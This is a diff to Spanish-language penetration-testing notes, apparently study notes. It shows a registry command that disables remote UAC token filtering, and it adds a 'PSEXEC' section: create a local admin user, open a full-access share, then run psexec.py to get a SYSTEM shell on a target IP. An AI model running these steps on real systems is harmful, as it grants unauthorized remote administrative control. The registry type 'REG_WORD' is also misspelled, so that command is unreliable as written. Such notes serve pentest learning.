@@ -1389,7 +1389,14 @@ En términos prácticos, este comando está modificando el Registro de Windows p
 ```
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_WORD /d 1 /f
 ```
+## PSEXEC s4vitar Bounty
 
+Igual permite regresar una shell con permisos de authority system. Pasos previos tener el puerto 445 abierto agregar el usuario s4vitar, agregar al usuario a lo administradores y crear un recuerso compartido donde los administradores tengan acceso FULL.
+
+```
+psexec.py WORKGROUP/s4vitar@10.10.14.22 cmd.exe
+Password:
+```
 
 
 
